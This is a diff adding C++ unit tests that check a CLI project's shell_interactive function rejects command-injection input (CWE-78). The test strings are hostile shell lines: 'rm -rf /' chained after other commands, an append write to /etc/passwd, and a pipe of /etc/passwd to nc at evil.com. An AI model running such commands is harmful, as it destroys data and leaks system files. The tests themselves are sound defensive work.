@@ -193,5 +193,57 @@ TEST(ProcessTest, DrainPipesWithInputNoConcurrentDeadlock) {
     EXPECT_NE(result.stderr_output.find("err_500"), std::string::npos);
 }
 
+// --- shell_interactive: command injection prevention (CWE-78) ---
+
+TEST(ProcessTest, ShellInteractiveRejectsCommandSubstitution) {
+    EXPECT_EQ(Process::shell_interactive("echo $(whoami)"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsBackticks) {
+    EXPECT_EQ(Process::shell_interactive("echo `whoami`"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsSemicolon) {
+    EXPECT_EQ(Process::shell_interactive("echo hello; rm -rf /"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsAnd) {
+    EXPECT_EQ(Process::shell_interactive("true && rm -rf /"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsOr) {
+    EXPECT_EQ(Process::shell_interactive("false || rm -rf /"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsPipe) {
+    EXPECT_EQ(Process::shell_interactive("cat /etc/passwd | nc evil.com 1234"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsRedirectAppend) {
+    EXPECT_EQ(Process::shell_interactive("echo data >> /etc/passwd"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsHeredoc) {
+    EXPECT_EQ(Process::shell_interactive("cat << EOF"), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsEmpty) {
+    EXPECT_EQ(Process::shell_interactive(""), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveRejectsOversized) {
+    std::string oversized(4097, 'A');
+    EXPECT_EQ(Process::shell_interactive(oversized), -1);
+}
+
+TEST(ProcessTest, ShellInteractiveAllowsSimpleCommand) {
+    // "true" is a safe, no-op command
+    EXPECT_EQ(Process::shell_interactive("true"), 0);
+}
+
+TEST(ProcessTest, ShellInteractiveAllowsPathWithSpaces) {
+    EXPECT_EQ(Process::shell_interactive("ls /tmp"), 0);
+}
+
 } // namespace
 } // namespace euxis::cli
